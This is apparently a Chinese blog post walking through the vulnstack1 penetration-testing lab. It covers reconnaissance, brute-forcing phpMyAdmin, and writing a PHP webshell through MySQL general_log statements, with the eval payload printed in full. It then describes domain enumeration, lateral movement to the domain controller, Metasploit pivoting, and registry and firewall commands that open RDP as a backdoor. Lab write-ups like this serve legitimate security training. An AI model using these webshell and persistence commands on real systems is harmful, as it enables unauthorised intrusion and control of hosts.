---
typora-root-url: ../../../static
title: "vulnstack1笔记"
date: 2021-05-26T00:28:36+08:00
draft: false
tags: ["note"]
categories: ["security"]
---

## 网络环境
模拟黑盒环境，所以只知道内网win7的公网ip，拓扑图如下图所示：

![靶场网络拓扑][p1]

## 边界打点
首先需要拿下对外开放服务的win7，已知其公网ip为192.168.0.107，直接nmap扫描一下：

![nmap扫描结果][p2]

发现开放了80、3306端口(下面的3389是我留的rdp后门，一开始是没有的)，那么接下来可以通过80的WEB服务入侵，也可以爆破登录试试3306端口的mysql；下面首先访问下网站：

![访问网站][p3]

打开发现是一个phpstudy的探针界面，比较有用的信息有靶机的物理路径以及phpstudy的版本信息。接下来直接使用phpstudy的nday尝试攻击，最终失败了。那么接下来扫一下目录：

![目录扫描][p4]

扫到了phpmyadmin，于是访问试试，尝试弱口令爆破进入：

![phpmyadmin][p5]

![phpmyadmin][p6]

进入phpmyadmin了，然后直接开放root的远程登录权限（因为phpmyadmin太卡了）：

![phpmyadmin][p7]

因为是root权限，且前面通过探针得到了网站的物理路径，那么我们就可以通过mysql的日志写一句话木马拿到webshell，直接执行如下SQL语句：

	set global general_log = on;
	set global general_log_file='C:/phpStudy/WWW/caidao.php';
	SELECT "<?php @eval($_POST['shell']);?>";

然后用菜刀连接写入的webshell：

![菜刀连接][p8]

## 内网渗透
通过菜刀发现了服务器上还运行了一个cms，所以其实还可以通过这个cms拿webshell，但是现在已经拿到了，就不继续了。我们直接通过菜刀把shell传到CS上：

![CS上线][p9]

发现上线的win7是administrator权限，这个权限已经很高了，基本可以满足，也可以通过ms14-058提权到system。接下来就是基本的信息收集了：

首先whoami，发现是god\Administrator：

![whoami][p10]

然后通过ipconfig看看是否存在域：

![是否存在域][p11]

![是否存在域][p12]

初看，是存在域的，域名为 `god.org` ,一般DSN服务器就是域控，我们nslookup一下域名，看看ip是不是上面的 `192.168.52.138` ：

![查找域控][p13]

然后我们查看一下域内存活机器，使用ICMP扫描一下：

	for /l %i in (1,1,255) do @ping 192.168.52.%i -w 1 -n 1|find /i "ttl="

结果如下所示：

![域内存活主机][p14]

整理下目前的已知信息：

- 存在域：god.org；
- 域控：192.168.52.138；
- win7跳板机：内网ip为192.168.52.143，当前登录身份为域管（god\Administrator）;
- 域内其余存活主机：192.168.52.141；

现在先准备快速的横向，既然是域管权限，那么我们直接尝试使用当前身份远程登录域控：

![拿下域控][p15]

如法炮制，拿下域内另一台机器：

![拿下另一条机器][p16]

当然，还可以使用其他方式横向，本靶场可以使用的方法还有：

- ms17-010；
- ms14-068;
- PTH和PTT；

使用MSF进行ms17-010攻击的时候，需要将MSF带入内网，CS把Shell外联到MSF后，MSF需要在meterpreter下进行如下设置，方可穿透内网：

	# 获取当前shell的子网
	run get_local_subnets
	# 设置MSF的路由
	run autoroute -s 192.168.52.0/24
	# 将当前meterpreter放入后台
	background
	# 打印下当前MSF的路由
	route print

然后就是直接用MSF扫ms17-010了。现在一个问题是，内网的两台机器是不出网的，怎么拿shell？那么肯定不可以反弹shell了，因为不出网，所以只能正向连接shell；或者还有一种方法，在CS中选择跳板机，右键，如下所示：

![piovting][p17]

然后就可以在跳板机上开一个监听，将shell反弹到跳板机上即可；此外，就是关于开启RDP的一些步骤，如下所示：

	# 查看是否开启RDP，1表示关闭，0表示开启
	REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
	# 依次执行以下两条命令
	REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
	REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
	# 在靶机中创建如下test.reg
	Windows Registry Editor Version 5.00
	[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
	"fDenyTSConnections"=dword:00000000
	[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
	"PortNumber"=dword:00000d3d
	# 执行如下命令，导入上面的注册表信息
	regedit /s test.reg
	# 防火墙放行3389端口
	netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
	
	




[p1]:/media/2021-05-26-1.png
[p2]:/media/2021-05-26-5.png
[p3]:/media/2021-05-26-2.png
[p4]:/media/2021-05-26-3.png
[p5]:/media/2021-05-26-4.png
[p6]:/media/2021-05-26-6.png
[p7]:/media/2021-05-26-7.png
[p8]:/media/2021-05-26-8.png
[p9]:/media/2021-05-26-9.png
[p10]:/media/2021-05-26-10.png
[p11]:/media/2021-05-26-11.png
[p12]:/media/2021-05-26-12.png
[p13]:/media/2021-05-26-13.png
[p14]:/media/2021-05-26-14.png
[p15]:/media/2021-05-26-15.png
[p16]:/media/2021-05-26-16.png
[p17]:/media/2021-05-26-17.png







